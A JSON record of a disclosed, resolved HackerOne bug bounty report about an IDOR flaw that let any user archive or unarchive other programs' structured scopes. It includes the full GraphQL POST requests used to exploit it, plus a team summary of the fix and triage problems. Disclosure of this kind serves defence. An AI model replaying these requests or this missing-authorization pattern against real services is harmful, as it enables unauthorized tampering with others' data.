@@ -1,0 +1,145 @@
+{
+  "id": 1501611,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNTAxNjEx",
+  "url": "https://hackerone.com/reports/1501611",
+  "title": "An attacker can archive and unarchive any structured scope object on HackerOne",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "high",
+  "readable_substate": "Resolved",
+  "created_at": "2022-03-05T22:21:29.932Z",
+  "submitted_at": "2022-03-05T22:21:30.013Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "ahacker1",
+    "url": "/ahacker1",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/vllgks9w6232xyo136ujj5cbt47w/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1"
+    },
+    "is_me?": false,
+    "cleared": true,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 13,
+    "url": "https://hackerone.com/security",
+    "handle": "security",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/013/fa942b9b1cbf4faf37482bf68458e1195aab9c02_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "HackerOne",
+      "twitter_handle": "Hacker0x01",
+      "website": "https://hackerone.com",
+      "about": "Vulnerability disclosure should be safe, transparent, and rewarding."
+    }
+  },
+  "has_bounty?": true,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": false,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": true,
+  "disclosed_at": "2022-04-18T18:22:22.857Z",
+  "bug_reporter_agreed_on_going_public_at": "2022-04-08T02:13:48.973Z",
+  "team_member_agreed_on_going_public_at": "2022-04-18T18:22:21.640Z",
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "**Summary:**\nHello, I have discovered an IDOR vulnerability that allows the scope of any program to be archived. Scopes are used to give information about the valid scopes of a program. For example HackerOne has the following scopes:\nhttps://hackerone.com\nhttps://api.hackerone.com\n...\n\n### Steps To Reproduce\n\n1. Obtain the structured_scope_id: \nThis can be found by base64 encoding: gid://hackerone/StructuredScope/NUMBER\nFor example, if the number was 94773 , the structered_scope_id would be Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\nOr, it could be found by intercepting the response of the program profile page.\n\n2. Send the Following Request:\n``` \nPOST /graphql HTTP/2\nHost: hackerone.com\nContent-Length: 388\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"\nAccept: */*\nX-Auth-Token: AUTHTOKEN\nContent-Type: application/json\nOrigin: https://hackerone.com\nReferer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\n\n{\"operationName\":\"ArchiveScope\",\"variables\":{\"structured_scope_id\":\"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\"},\"query\":\"mutation ArchiveScope($structured_scope_id: ID!) {\\n  archiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\\n    was_successful\\n    structured_scope {\\n      id\\n      archived_at\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\nIt is also possible to unarchive scopes of other programs with the following request.:\n```\nPOST /graphql HTTP/2\nHost: hackerone.com\nContent-Length: 414\nSec-Ch-Ua: \" Not A;Brand\";v=\"99\", \"Chromium\";v=\"98\", \"Google Chrome\";v=\"98\"\nAccept: */*\nX-Auth-Token: ████\nContent-Type: application/json\nOrigin: https://hackerone.com\nReferer: https://hackerone.com/hackerone_com_h1b/scopes/94774/edit\nAccept-Encoding: gzip, deflate\nAccept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7\n\n{\"operationName\":\"UnarchiveStructuredScope\",\"variables\":{\"structured_scope_id\":\"Z2lkOi8vaGFja2Vyb25lL1N0cnVjdHVyZWRTY29wZS85NDc3Mw==\"},\"query\":\"mutation UnarchiveStructuredScope($structured_scope_id: ID!) {\\n  unarchiveStructuredScope(input: {structured_scope_id: $structured_scope_id}) {\\n    was_successful\\n    structured_scope {\\n      id\\n      archived_at\\n      __typename\\n    }\\n    __typename\\n  }\\n}\\n\"}\n```\nEven though the response will say no structured scope exists, the scope will be archived.\nReplace the structured_scope_id with the scope you wish to target and the X-Auth-Token with your token.\nI will provide an Mp4 PoC soon.\n\n## Impact\n\nAn attacker could archive or unarchive all 90000+ scopes on HackerOne.",
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [],
+  "allow_singular_disclosure_at": "2022-05-08T02:13:49.085Z",
+  "allow_singular_disclosure_after": -126363475.74387412,
+  "singular_disclosure_allowed": true,
+  "vote_count": 317,
+  "voters": [
+    "neeythann",
+    "njmulsqb",
+    "0x_alibabas",
+    "tgadams",
+    "orange303",
+    "cxzer0",
+    "rondons",
+    "jumpydata",
+    "p4n7h3rx",
+    "bisesh",
+    "and 307 more..."
+  ],
+  "severity": {
+    "rating": "high",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 3,
+    "asset_type": "URL",
+    "asset_identifier": "hackerone.com",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "id": 145138,
+      "category": "team",
+      "content": "@ahacker1 found an Insecure Direct Object Reference (IDOR) vulnerability that allowed anyone to archive and unarchive an asset on HackerOne.com. This wasn't an easy vulnerability to spot: when exploited, the system would return an error indicating that the object wasn't found. However, the asset would still be archived or unarchived. We want to thank @ahacker1 for their persistence and disclosing the security vulnerability to us!\n\n**A note on the triage experience**: this was a poor triage experience for the reporter. Although the security analyst followed up after each comment from the reporter, they were unable to reproduce the described vulnerability. The hacker, rightfully so, was persistent that they had found a security vulnerability. \n\nWe're taking steps to improve this. Specifically, HackerOne's security operations team has taken feedback from the engineering team about which questions to ask in the future that will help determine the legitimacy of a security vulnerability faster. Reports will also be assigned to the HackerOne engineering team faster. We are exploring how to roll out these triage changes to other customers. Lastly, HackerOne's engineering team also added a number of asset IDs to [our policy](https://hackerone.com/security/policy_versions?type=team&change=3669996) to help reproduce similar vulnerabilities. We aim to continuously expand this list of known identifiers for hackers to proof security vulnerabilities in production.\n\nThat said, we'd be remiss if we didn't acknowledge that this vulnerability was hard to understand. When exploited, the video proof of concept showed a 404 page not found error and did not clearly demonstrate switching between different users or a program that the attacker didn't have access to.",
+      "updated_at": "2022-04-19T17:05:06.558Z",
+      "can_view?": true,
+      "can_create?": false,
+      "attachments": [],
+      "user": {
+        "id": 2,
+        "username": "jobert",
+        "name": "Jobert",
+        "bio": "Co-founder of HackerOne. ಠ_ಠ",
+        "cleared": false,
+        "verified": false,
+        "website": "https://hackerone.com",
+        "location": "San Francisco, CA",
+        "created_at": "2013-03-08T01:17:12.256Z",
+        "url": "https://hackerone.com/jobert",
+        "hackerone_triager": false,
+        "hackerone_employee": true,
+        "user_type": "company",
+        "profile_picture_urls": {
+          "small": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
+          "medium": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c",
+          "xtralarge": "https://profile-photos.hackerone-user-content.com/variants/ht4b9SmcYNqmpbyCFXd7cxHB/d6d8259739a2a4d509639b7804214d057bca547cc3fafe509ec3e3a86321b1d1"
+        }
+      }
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
